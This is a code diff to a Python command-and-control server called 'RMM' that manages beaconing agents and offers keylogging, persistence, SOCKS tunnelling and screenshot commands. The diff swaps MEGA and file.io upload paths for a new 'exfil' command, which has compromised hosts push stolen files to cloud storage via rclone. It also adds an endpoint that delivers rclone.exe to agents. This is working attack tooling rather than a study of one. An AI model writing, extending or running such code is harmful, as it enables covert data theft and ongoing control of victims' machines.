@@ -40,8 +40,15 @@ except ImportError:
 
 from rmm_ws import OperatorEventHub, WebSocketConnection
 from rmm_socks import DEFAULT_SOCKS_PORT, DEFAULT_BIND_HOST, SocksManager
-from rmm_mega import load_mega_config, upload_file_to_mega, MegaConfigError
-
+from rmm_rclone import (
+    RcloneConfigError,
+    RCLONE_MAX_BYTES,
+    RCLONE_BIN_PATH,
+    DEFAULT_PROFILE,
+    build_exfil_command,
+    rclone_binary_available,
+    rclone_public_config,
+)
 # History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
 HISTORY_FILE = os.path.expanduser("~/.RMM_history")
 
@@ -80,9 +87,6 @@ def _env_int(name: str, default: int) -> int:
 
 # Per HTTP POST (each download chunk). Override with RMM_MAX_BODY_BYTES.
 MAX_BODY_BYTES = _env_int("RMM_MAX_BODY_BYTES", 32 * 1024 * 1024)
-# Agent → server → MEGA uploads: max remote file size (lab default 100 MB).
-MEGA_MAX_BYTES = _env_int("RMM_MEGA_MAX_BYTES", 100 * 1024 * 1024)
-MEGA_STAGING_DIR = os.path.join(LOG_DIR, "mega_staging")
 
 
 def secure_compare(provided: str, expected: str) -> bool:
@@ -94,24 +98,6 @@ def secure_compare(provided: str, expected: str) -> bool:
     a = provided.encode("utf-8", errors="replace")
     b = expected.encode("utf-8", errors="replace")
     return secrets.compare_digest(a, b)
-
-
-def mega_public_config() -> dict:
-    """Operator-safe MEGA account status (no password)."""
-    return load_mega_config().public_dict()
-
-
-def require_mega_ready() -> dict:
-    """Return public config or raise ValueError with operator message."""
-    cfg = load_mega_config()
-    if not cfg.configured:
-        raise ValueError(
-            "MEGA not configured — set RMM_MEGA_EMAIL and RMM_MEGA_PASSWORD on the server"
-        )
-    pub = cfg.public_dict()
-    if not pub.get("library_available"):
-        raise ValueError("mega.py-v2 not installed — pip install mega.py-v2 (Python 3.10+)")
-    return pub
 
 
 _BEACON_SESSION_UUID_RE = re.compile(
@@ -269,7 +255,7 @@ class Completer:
         self.commands = [
             'list', 'use', 'info', 'background', 'kill',
             'set_sleep', 'set_jitter', 'show_config',
-            'download', 'upload', 'mega', 'screenshot', 'socks',
+            'download', 'upload', 'exfil', 'screenshot', 'socks',
             'keylog', 'persist', 'stop',
             'install_persist', 'remove_persist',
             'help', 'clear', 'quit', 'exit',
@@ -645,10 +631,20 @@ class RMMServer:
         self.note_download_queued(session, remote_path)
         return cmd
 
-    def queue_agent_mega(self, session, remote_path: str) -> str:
-        """Queue __MEGA__ on the agent (stage file on server, upload to MEGA account)."""
-        require_mega_ready()
-        cmd = f"__MEGA__ {remote_path}"
+    def queue_agent_exfil(
+        self,
+        session,
+        remote_path: str,
+        profile_name: str,
+        dest: str | None = None,
+    ) -> str:
+        """Queue __EXFIL__ on the agent (rclone upload from agent host)."""
+        if not rclone_binary_available():
+            raise ValueError(
+                f"rclone binary not found — place rclone.exe at {RCLONE_BIN_PATH} "
+                "or set RMM_RCLONE_BIN"
+            )
+        cmd = build_exfil_command(remote_path, profile_name, dest=dest)
         self.set_command(session.id, cmd, "oneshot")
         return cmd
 
@@ -1131,50 +1127,6 @@ class RMMServer:
         os.replace(staging_path, final_path)
         return final_path
 
-    def _save_mega_staging(self, session, data: dict, timestamp: str) -> str | None:
-        """Write agent mega_staging payload. Returns final path when complete, else None (chunk)."""
-        raw_name = data.get("filename", f"unknown_{timestamp}")
-        filename = safe_storage_filename(raw_name, f"unknown_{timestamp}")
-        os.makedirs(MEGA_STAGING_DIR, exist_ok=True)
-        prefix = safe_session_storage_prefix(session.id)
-        final_path = safe_join_under(MEGA_STAGING_DIR, f"{prefix}_{filename}")
-        content = base64.b64decode(data.get("content", "") or "")
-
-        if "offset" not in data:
-            with open(final_path, "wb") as f:
-                f.write(content)
-            return final_path
-
-        upload_id = re.sub(r"[^\w-]", "", str(data.get("upload_id") or "default"))[:64] or "default"
-        staging_path = safe_join_under(MEGA_STAGING_DIR, f"{prefix}_{upload_id}.part")
-        offset = int(data.get("offset", 0))
-        mode = "wb" if offset == 0 else "ab"
-        with open(staging_path, mode) as f:
-            f.write(content)
-        if not data.get("eof"):
-            return None
-        os.replace(staging_path, final_path)
-        return final_path
-
-    def _finish_mega_upload(self, session, filepath: str, remote_path: str) -> dict:
-        """Upload staged file to MEGA and return result payload for events."""
-        dest_name = os.path.basename(filepath)
-        try:
-            outcome = upload_file_to_mega(filepath, dest_filename=dest_name)
-        finally:
-            try:
-                os.remove(filepath)
-            except OSError:
-                pass
-        return {
-            "type": "mega_upload",
-            "remote_path": remote_path,
-            "success": bool(outcome.get("success")),
-            "link": outcome.get("link"),
-            "size": outcome.get("size", 0),
-            "error": outcome.get("error"),
-        }
-
     def handle_result(self, session_id, result, cmd_type="output"):
         session = self.get_session(session_id)
         if not session:
@@ -1243,72 +1195,31 @@ class RMMServer:
             event_body = result
             tty_lines.append(("log", f"Session {session.id[:8]} acknowledged config update", "SUCCESS"))
 
-        elif cmd_type == "mega_staging":
-            try:
-                data = json.loads(result)
-                filepath = self._save_mega_staging(session, data, timestamp)
-                if not filepath:
-                    return
-                remote_path = (data.get("remote_path") or "").strip()
-                if not remote_path:
-                    remote_path = data.get("filename", "")
-                payload = self._finish_mega_upload(session, filepath, remote_path)
-                echoed_cmd = f"__MEGA__ {remote_path}".strip()
-                if payload.get("success"):
-                    link = (payload.get("link") or "").strip()
-                    event_body = f"{remote_path} → {link}" if link else remote_path
-                    tty_lines.append(("log", f"MEGA upload: {link or remote_path}", "SUCCESS"))
-                else:
-                    err = payload.get("error") or "MEGA upload failed"
-                    event_body = f"{remote_path}: {err}" if remote_path else str(err)
-                    tty_lines.append(("log", f"MEGA upload failed: {err}", "ERROR"))
-                cmd_type = "mega_upload"
-            except MegaConfigError as e:
-                event_body = str(e)
-                echoed_cmd = None
-                cmd_type = "mega_upload"
-                tty_lines.append(("log", f"MEGA config error: {e}", "ERROR"))
-            except Exception as e:
-                event_body = str(e)
-                echoed_cmd = None
-                cmd_type = "mega_upload"
-                tty_lines.append(("log", f"MEGA staging error: {e}", "ERROR"))
-
-        elif cmd_type == "mega_upload":
+        elif cmd_type == "cloud_upload":
             try:
                 data = json.loads(result)
                 remote_path = (data.get("remote_path") or "").strip()
-                echoed_cmd = f"__MEGA__ {remote_path}".strip()
+                profile = (data.get("profile") or "").strip()
+                echoed_cmd = f"exfil {remote_path}" + (f" --profile {profile}" if profile else "")
                 if data.get("success"):
                     link = (data.get("link") or "").strip()
-                    event_body = f"{remote_path} → {link}" if link else remote_path
-                    tty_lines.append(("log", f"MEGA upload: {link or remote_path}", "SUCCESS"))
+                    dest = (data.get("dest") or "").strip()
+                    backend = (data.get("backend") or "").strip()
+                    label = backend or profile or "cloud"
+                    if link:
+                        event_body = f"{remote_path} → {link}"
+                    elif dest:
+                        event_body = f"{remote_path} → {label}:{dest}"
+                    else:
+                        event_body = remote_path
+                    tty_lines.append(("log", f"Exfil ({label}): {link or dest or remote_path}", "SUCCESS"))
                 else:
-                    err = data.get("error") or "MEGA upload failed"
+                    err = data.get("error") or "Exfil failed"
                     event_body = f"{remote_path}: {err}" if remote_path else str(err)
-                    tty_lines.append(("log", f"MEGA upload failed: {err}", "ERROR"))
+                    tty_lines.append(("log", f"Exfil failed: {err}", "ERROR"))
             except Exception as e:
                 event_body = str(e)
-                tty_lines.append(("log", f"MEGA result error: {e}", "ERROR"))
-
-        elif cmd_type == "fileio_upload":
-            try:
-                data = json.loads(result)
-                remote_path = (data.get("remote_path") or "").strip()
-                echoed_cmd = f"__FILEIO__ {remote_path}".strip()
-                if data.get("success"):
-                    link = (data.get("link") or "").strip()
-                    if not link and data.get("key"):
-                        link = f"https://file.io/{data.get('key')}"
-                    event_body = f"{remote_path} → {link}" if link else remote_path
-                    tty_lines.append(("log", f"file.io upload: {link or remote_path}", "SUCCESS"))
-                else:
-                    err = data.get("error") or "file.io upload failed"
-                    event_body = f"{remote_path}: {err}" if remote_path else str(err)
-                    tty_lines.append(("log", f"file.io upload failed: {err}", "ERROR"))
-            except Exception as e:
-                event_body = str(e)
-                tty_lines.append(("log", f"file.io result error: {e}", "ERROR"))
+                tty_lines.append(("log", f"Exfil result error: {e}", "ERROR"))
 
         else:
             text, echoed_cmd = self._unwrap_rmm_result_text(result)
@@ -1547,6 +1458,21 @@ class RMMHandler(BaseHTTPRequestHandler):
     def _beacon_forbidden(self):
         self._respond(403, "FORBIDDEN")
 
+    def _serve_rclone_tool(self) -> bool:
+        """Beacon-authenticated download of rclone.exe for agent bootstrap."""
+        if not rclone_binary_available():
+            self._respond(404, "rclone binary not configured on server")
+            return True
+        with open(RCLONE_BIN_PATH, "rb") as f:
+            data = f.read()
+        self.send_response(200)
+        self.send_header("Content-Type", "application/octet-stream")
+        self.send_header("Content-Disposition", 'attachment; filename="rclone.exe"')
+        self.send_header("Cache-Control", "no-cache")
+        self.end_headers()
+        self._safe_write(data)
+        return True
+
     def _serve_web(self, path: str) -> bool:
         """Serve static files from WEB_DIR under /ui/ (and redirect / → /ui/)."""
         if path in ("", "/"):
@@ -1597,8 +1523,8 @@ class RMMHandler(BaseHTTPRequestHandler):
             return False
         srv = self.server_instance
 
-        if parts == ["mega", "config"]:
-            self._json(200, mega_public_config())
+        if parts == ["rclone", "config"]:
+            self._json(200, rclone_public_config())
             return True
 
         if parts == ["health"]:
@@ -1754,7 +1680,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._json(200, {"ok": True, "session_id": session.id, "queued": cmd})
             return True
 
-        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "mega":
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exfil":
             session = srv.resolve_session(parts[1])
             if not session:
                 self._json(404, {"error": "session_not_found"})
@@ -1763,20 +1689,23 @@ class RMMHandler(BaseHTTPRequestHandler):
             if not remote_path:
                 self._json(400, {"error": "missing_remote_path"})
                 return True
+            profile = (body.get("profile") or DEFAULT_PROFILE).strip()
+            dest = (body.get("dest") or "").strip() or None
             try:
-                cmd = srv.queue_agent_mega(session, remote_path)
-            except ValueError as e:
-                self._json(503, {"error": str(e), "mega": mega_public_config()})
+                cmd = srv.queue_agent_exfil(session, remote_path, profile, dest=dest)
+            except (ValueError, RcloneConfigError) as e:
+                self._json(503, {"error": str(e), "rclone": rclone_public_config()})
                 return True
-            srv.record_operator_action(session, cmd, "mega")
+            srv.record_operator_action(session, cmd.split("\n", 1)[0], "exfil")
             self._json(
                 200,
                 {
                     "ok": True,
                     "session_id": session.id,
-                    "queued": cmd,
-                    "max_bytes": MEGA_MAX_BYTES,
-                    "mega": mega_public_config(),
+                    "queued": cmd.split("\n", 1)[0],
+                    "profile": profile,
+                    "max_bytes": RCLONE_MAX_BYTES,
+                    "rclone": rclone_public_config(),
                 },
             )
             return True
@@ -1949,6 +1878,20 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return
             self._respond(404, "Not Found")
             return
+
+        if path == "/tools/rclone.exe":
+            if not self._beacon_authorized(qs):
+                self._beacon_forbidden()
+                return
+            err, session_id = self._beacon_session_id_from_qs(qs)
+            if err:
+                self._respond(400, err)
+                return
+            if not self.server_instance.get_session(session_id):
+                self._respond(404, "Unknown session")
+                return
+            if self._serve_rclone_tool():
+                return
 
         if self._serve_web(path):
             return
@@ -2170,7 +2113,7 @@ class CommandInterface:
 
 {Colors.CYAN}File Operations:{Colors.END}
   {Colors.GREEN}download <file>{Colors.END}          - Download file from target
-  {Colors.GREEN}mega <file>{Colors.END}              - Upload remote file to MEGA (server account)
+  {Colors.GREEN}exfil <file> [profile]{Colors.END}   - Upload remote file via rclone (agent)
   {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target
 
 {Colors.CYAN}Tunneling:{Colors.END}
@@ -2372,22 +2315,23 @@ class CommandInterface:
                 else:
                     self.server.tty_print(f"{Colors.RED}Usage: download <file>{Colors.END}")
 
-            elif cmd == "mega":
+            elif cmd == "exfil":
                 if args:
                     session = self.server.get_session(self.server.current_session)
                     if not session:
                         self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                     else:
-                        filepath = " ".join(args)
+                        filepath = args[0]
+                        profile = args[1] if len(args) > 1 else DEFAULT_PROFILE
                         try:
-                            self.server.queue_agent_mega(session, filepath)
+                            self.server.queue_agent_exfil(session, filepath, profile)
                             self.server.tty_print(
-                                f"{Colors.DIM}MEGA upload queued for {filepath}...{Colors.END}"
+                                f"{Colors.DIM}Exfil queued ({profile}): {filepath}...{Colors.END}"
                             )
-                        except ValueError as e:
+                        except (ValueError, RcloneConfigError) as e:
                             self.server.tty_print(f"{Colors.RED}{e}{Colors.END}")
                 else:
-                    self.server.tty_print(f"{Colors.RED}Usage: mega <remote_file>{Colors.END}")
+                    self.server.tty_print(f"{Colors.RED}Usage: exfil <remote_file> [profile]{Colors.END}")
 
             elif cmd == "upload":
                 if len(args) >= 2:
